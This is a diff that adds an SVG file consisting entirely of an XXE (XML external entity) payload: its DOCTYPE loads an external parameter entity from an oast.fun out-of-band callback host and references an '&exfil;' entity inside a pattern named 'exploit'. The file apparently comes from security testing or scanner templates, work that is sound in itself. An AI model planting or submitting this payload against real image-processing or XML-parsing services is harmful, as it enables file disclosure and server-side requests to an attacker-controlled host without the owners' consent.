@@ -1,0 +1,13 @@
+<!DOCTYPE svg [
+<!ENTITY % outside SYSTEM "http://cjoregr82vsa90ul45kgu56e89ezdpeoa.oast.fun">
+%outside;
+]>
+<svg>
+<defs>
+<pattern id="exploit">
+  <text x="10" y="10">
+    &exfil;
+  </text>
+</pattern>
+</defs>
+</svg>
